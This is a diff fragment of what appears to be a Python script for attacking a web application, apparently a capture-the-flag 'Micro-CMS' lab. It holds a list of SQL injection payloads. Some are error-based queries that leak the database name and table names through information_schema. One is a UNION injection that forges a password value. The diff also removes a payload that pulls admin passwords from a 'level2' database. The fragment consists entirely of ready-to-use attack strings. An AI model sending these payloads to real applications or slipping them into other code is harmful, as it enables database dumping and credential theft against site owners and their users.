@@ -41,13 +41,6 @@ headers = {'User-Agent': 'Mozilla/5.0'}
 
 micro_cms1 = [ "' OR (SELECT 1 from (select count(*), (concat('~',(select database()),'~',floor(rand(0)*2)))c from information_schema.tables group by c)a) AND '1' = '1 ", 
         "' OR (select 1 from (select count(*),concat((select(select concat(cast(table_name as char),0x7e)) from information_schema.tables where table_schema=database() limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) AND '1' = '1 ",
-
-       " ' OR (select 1 from(select count(*),concat((select (select (SELECT concat(0x7e,0x27,cast(admins.password as char),0x27,0x7e) FROM 'level2'.admins LIMIT 0,1) ) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) AND '1' = 1 ",
-        
-
-
-
-
 " ' UNION SELECT 'pass' AS password#    "
         
 
